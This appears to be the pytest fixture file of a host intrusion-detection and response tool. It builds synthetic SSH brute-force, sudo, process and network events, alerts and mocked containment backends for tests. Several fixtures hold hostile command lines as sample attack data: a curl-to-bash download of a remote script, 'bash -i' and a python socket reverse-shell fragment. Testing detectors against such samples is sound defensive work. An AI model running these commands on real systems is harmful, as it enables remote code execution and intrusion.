"""Shared synthetic fixtures for the test suite.

Every test builds its own events here.  Nothing in the test suite reads the
real system journal or /var/log.

Phase 7 adds a second, stronger rule, enforced by :func:`no_real_containment`
below: **no test may touch the real firewall, signal a real process, or end a
real session.**  Containment backends are replaced with in-memory mocks for
every test in the suite, so running ``pytest`` on the machine SentinelForge
monitors cannot change that machine.
"""

from datetime import datetime, timedelta, timezone

import pytest

from sentinelforge.detection.mitre import mapping
from sentinelforge.models.alert import Alert
from sentinelforge.models.event import EventType, SecurityEvent, Severity

#: Fixed reference time so every test is deterministic.
BASE_TIME = datetime(2026, 9, 12, 10, 30, 0, tzinfo=timezone.utc)


def at(offset_seconds: float) -> str:
    """Return an event timestamp ``offset_seconds`` after :data:`BASE_TIME`."""
    return (BASE_TIME + timedelta(seconds=offset_seconds)).strftime("%Y-%m-%dT%H:%M:%SZ")


def make_event(offset_seconds: float = 0, **overrides) -> SecurityEvent:
    """Build a synthetic normalized event.

    Defaults describe a benign sshd log line; pass overrides for what matters
    to the test.
    """
    fields = {
        "timestamp": at(offset_seconds),
        "host": "fedora",
        "source": "systemd-journal",
        "event_type": EventType.UNKNOWN,
        "severity": Severity.INFO,
        "process": "sshd",
        "message": "",
        "raw": "",
    }
    fields.update(overrides)
    return SecurityEvent(**fields)


def failed_ssh(offset_seconds: float, src_ip: str = "192.168.1.50", user: str = "root"):
    """A failed SSH password authentication, as Phase 1 would normalize it."""
    return make_event(
        offset_seconds,
        event_type=EventType.AUTHENTICATION_FAILURE,
        severity=Severity.MEDIUM,
        user=user,
        src_ip=src_ip,
        message=f"Failed password for {user} from {src_ip} port 22 ssh2",
    )


def invalid_user_ssh(offset_seconds: float, src_ip: str, user: str):
    """A failed SSH attempt for an account that does not exist."""
    return make_event(
        offset_seconds,
        event_type=EventType.AUTHENTICATION_FAILURE,
        severity=Severity.HIGH,
        user=user,
        src_ip=src_ip,
        message=f"Failed password for invalid user {user} from {src_ip} port 22 ssh2",
    )


def successful_ssh(offset_seconds: float, src_ip: str = "192.168.1.50", user: str = "root"):
    """A successful SSH password authentication."""
    return make_event(
        offset_seconds,
        event_type=EventType.AUTHENTICATION_SUCCESS,
        severity=Severity.LOW,
        user=user,
        src_ip=src_ip,
        message=f"Accepted password for {user} from {src_ip} port 22 ssh2",
    )


def sudo_event(offset_seconds: float, command: str, user: str = "capslock", target: str = "root"):
    """A sudo COMMAND log line."""
    return make_event(
        offset_seconds,
        event_type=EventType.SUDO,
        severity=Severity.MEDIUM,
        process="sudo",
        user=user,
        message=(
            f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER={target} ; COMMAND={command}"
        ),
    )


@pytest.fixture
def brute_force_events():
    """Five failed SSH logins from one address, 20 seconds apart."""
    return [failed_ssh(i * 20) for i in range(5)]


# --------------------------------------------------------------------------
# Phase 3 helpers: synthetic alerts, built directly rather than by running the
# detection engine, so correlation tests stay independent of rule tuning.
# --------------------------------------------------------------------------
ALERT_DEFAULTS = {
    "SSH_BRUTE_FORCE": ("SSH Brute Force", Severity.HIGH, 75, "T1110.001", None),
    "SSH_COMPROMISE_SUSPECTED": (
        "SSH Compromise Suspected",
        Severity.CRITICAL,
        90,
        "T1078.003",
        "Initial Access",
    ),
    "SUSPICIOUS_SUDO": ("Suspicious Sudo Activity", Severity.HIGH, 75, "T1548.003", None),
    "AUTH_INVALID_USER": (
        "Login Attempts For Nonexistent Users",
        Severity.MEDIUM,
        50,
        "T1110.001",
        None,
    ),
    "AUTH_REPEATED_FAILURES": (
        "Repeated Authentication Failures",
        Severity.MEDIUM,
        50,
        "T1110",
        None,
    ),
    "AUTH_ROOT_LOGIN_REMOTE": (
        "Remote Privileged Login",
        Severity.MEDIUM,
        50,
        "T1078.003",
        "Initial Access",
    ),
}


def make_alert(
    rule_id: str = "SSH_BRUTE_FORCE",
    offset_seconds: float = 0,
    alert_id: str = "ALT-000001",
    host: str = "fedora",
    src_ip: str | None = "192.168.1.50",
    user: str | None = "capslock",
    evidence=None,
    severity: str | None = None,
    risk_score: int | None = None,
    technique: str | None = None,
    description: str | None = None,
) -> Alert:
    """Build a synthetic alert that looks like Phase 2 output."""
    name, default_severity, default_score, default_technique, tactic = ALERT_DEFAULTS.get(
        rule_id, (rule_id, Severity.MEDIUM, 50, "T1110", None)
    )
    mitre = mapping(technique or default_technique, tactic)
    evidence = list(evidence or [])
    stamps = [event.timestamp for event in evidence if event.timestamp]
    return Alert(
        alert_id=alert_id,
        rule_id=rule_id,
        name=name,
        description=description or f"{name} on {host}",
        severity=severity or default_severity,
        risk_score=default_score if risk_score is None else risk_score,
        timestamp=at(offset_seconds),
        host=host,
        source_ip=src_ip,
        user=user,
        evidence=evidence,
        mitre=mitre.to_dict(),
        first_seen=min(stamps) if stamps else at(offset_seconds),
        last_seen=max(stamps) if stamps else at(offset_seconds),
    )


@pytest.fixture
def compromise_alerts():
    """The canonical chain: brute force -> successful login -> suspicious sudo."""
    failures = [failed_ssh(i * 60, user="capslock") for i in range(5)]
    success = successful_ssh(300, user="capslock")
    sudo = sudo_event(420, "/usr/bin/curl http://198.51.100.9/x.sh | bash")
    return [
        make_alert("SSH_BRUTE_FORCE", 240, "ALT-000001", evidence=failures),
        make_alert(
            "SSH_COMPROMISE_SUSPECTED", 300, "ALT-000002", evidence=failures + [success]
        ),
        make_alert("SUSPICIOUS_SUDO", 420, "ALT-000003", src_ip=None, evidence=[sudo]),
    ]


# --------------------------------------------------------------------------
# Phase 4/5 helpers: telemetry events and a ready-made correlated incident, so
# AI tests start from the same synthetic attack the rest of the suite uses.
# --------------------------------------------------------------------------
def process_event(
    offset_seconds: float,
    process: str = "bash",
    parent: str = "curl",
    command_line: str = "bash -i",
    pid: int = 4242,
    ppid: int = 4240,
    user: str = "capslock",
) -> SecurityEvent:
    """A process-execution event as the eBPF process sensor would emit it."""
    return make_event(
        offset_seconds,
        event_type=EventType.PROCESS_START,
        severity=Severity.INFO,
        source="ebpf-process",
        process=process,
        user=user,
        message=f"process {process} started by {parent}",
        metadata={
            "pid": pid,
            "ppid": ppid,
            "parent_process": parent,
            "command_line": command_line,
            "executable": f"/usr/bin/{process}",
        },
    )


def network_event(
    offset_seconds: float,
    process: str = "bash",
    destination: str = "198.51.100.9",
    port: int = 443,
    user: str = "capslock",
) -> SecurityEvent:
    """An outbound connection event as the eBPF network sensor would emit it."""
    return make_event(
        offset_seconds,
        event_type=EventType.NETWORK_CONNECTION,
        severity=Severity.INFO,
        source="ebpf-network",
        process=process,
        user=user,
        message=f"{process} connected to {destination}:{port}",
        metadata={
            "pid": 4242,
            "destination_ip": destination,
            "destination_port": port,
            "protocol": "tcp",
        },
    )


@pytest.fixture
def attack_events():
    """The full synthetic intrusion, in log order.

    SSH brute force -> successful authentication -> sudo -> process execution
    -> outbound network connection.  Every phase of the pipeline can run over
    this, which is what the end-to-end test does.
    """
    events = [failed_ssh(i * 40, user="capslock") for i in range(5)]
    events.append(successful_ssh(220, user="capslock"))
    events.append(sudo_event(280, "/usr/bin/curl http://198.51.100.9/x.sh | bash"))
    events.append(process_event(300))
    events.append(network_event(320))
    return events


@pytest.fixture
def compromise_incident(compromise_alerts):
    """One correlated incident built from :func:`compromise_alerts`."""
    from sentinelforge.correlation.engine import CorrelationEngine

    return CorrelationEngine().run(compromise_alerts)[0]


# --------------------------------------------------------------------------
# Phase 6 helpers: a temporary incident database and a dashboard test client.
# Flask is imported lazily inside the fixtures so the rest of the suite still
# runs if the optional dashboard extra is not installed.
# --------------------------------------------------------------------------
@pytest.fixture
def incident_db(tmp_path, compromise_alerts):
    """A database holding one correlated incident (no AI analysis)."""
    from sentinelforge.correlation.engine import CorrelationEngine
    from sentinelforge.storage.sqlite import IncidentStore

    path = str(tmp_path / "incidents.db")
    with IncidentStore(path) as store:
        store.save_all(CorrelationEngine().run(compromise_alerts))
    return path


@pytest.fixture
def empty_db(tmp_path):
    """A database with no incidents in it."""
    from sentinelforge.storage.sqlite import IncidentStore

    path = str(tmp_path / "empty.db")
    with IncidentStore(path) as store:
        store.connect()
    return path


@pytest.fixture
def dashboard_bus():
    """A private event bus, so tests never share the process-wide one."""
    from sentinelforge.bus import EventBus

    bus = EventBus()
    yield bus
    bus.close()


@pytest.fixture
def dashboard_context(incident_db, dashboard_bus):
    from sentinelforge.dashboard.state import DashboardConfig, DashboardContext

    context = DashboardContext(DashboardConfig(db_path=incident_db), bus=dashboard_bus)
    yield context
    context.stop()


@pytest.fixture
def dashboard_app(dashboard_context):
    """A dashboard app with no background threads: tests drive monitors directly."""
    from sentinelforge.dashboard.app import create_app

    app = create_app(context=dashboard_context, start_monitors=False)
    app.config.update(TESTING=True)
    return app


@pytest.fixture
def client(dashboard_app):
    return dashboard_app.test_client()


# --------------------------------------------------------------------------
# Phase 7: containment never reaches the real system during tests.
# --------------------------------------------------------------------------
@pytest.fixture(autouse=True)
def no_real_containment(monkeypatch):
    """Replace auto-detected response backends with in-memory mocks.

    ``ResponseBackends.detect()`` is what a CLI command or a dashboard process
    calls to find this host's firewall, process and session mechanisms.  Every
    test gets mocks instead, so a stray code path cannot install a firewall
    rule or send a signal on the developer's workstation -- and the suite does
    not shell out to ``firewall-cmd`` hundreds of times either.

    Tests that need to exercise the *real* backend classes build them directly
    with a fake command runner (see ``tests/test_response_backends.py``); they
    do not go through detection, so this fixture does not hide them.
    """
    from sentinelforge.response.actions import ResponseBackends
    from sentinelforge.response.backends.mock import (
        MockFirewallBackend,
        MockProcessBackend,
        MockSessionBackend,
    )
    from sentinelforge.response.executor import ReadOnlyCommandRunner

    def _mock_detect(cls, execution_enabled: bool = True):
        return cls(
            firewall=MockFirewallBackend(),
            process=_synthetic_processes(MockProcessBackend()),
            session=_synthetic_sessions(MockSessionBackend()),
            runner=ReadOnlyCommandRunner(),
        )

    monkeypatch.setattr(ResponseBackends, "detect", classmethod(_mock_detect))
    yield


def _synthetic_processes(backend):
    """The processes the canonical synthetic intrusion talks about."""
    backend.add(4250, name="python3", command_line="python3 -c import socket,subprocess",
                ppid=4242, username="capslock")
    backend.add(4242, name="bash", command_line="bash -i", username="capslock")
    return backend


def _synthetic_sessions(backend):
    """One synthetic remote session, as the intrusion scenario implies."""
    backend.add("42", name="capslock", remotehost="198.51.100.25")
    return backend


@pytest.fixture
def mock_backends():
    """A fresh set of in-memory containment backends, with targets to act on."""
    from sentinelforge.response.actions import ResponseBackends
    from sentinelforge.response.backends.mock import (
        MockFirewallBackend,
        MockProcessBackend,
        MockSessionBackend,
    )
    from sentinelforge.response.executor import ReadOnlyCommandRunner

    return ResponseBackends(
        firewall=MockFirewallBackend(),
        process=_synthetic_processes(MockProcessBackend()),
        session=_synthetic_sessions(MockSessionBackend()),
        runner=ReadOnlyCommandRunner(),
    )


@pytest.fixture
def response_engine(tmp_path, mock_backends):
    """A response engine backed by a temporary database and mock backends."""
    from sentinelforge.response.engine import ResponseEngine
    from sentinelforge.response.policy import PolicyConfig, ResponsePolicy

    return ResponseEngine(
        db_path=str(tmp_path / "response.db"),
        backends=mock_backends,
        policy=ResponsePolicy(PolicyConfig(cooldown_seconds=0)),
        actor="analyst",
    )
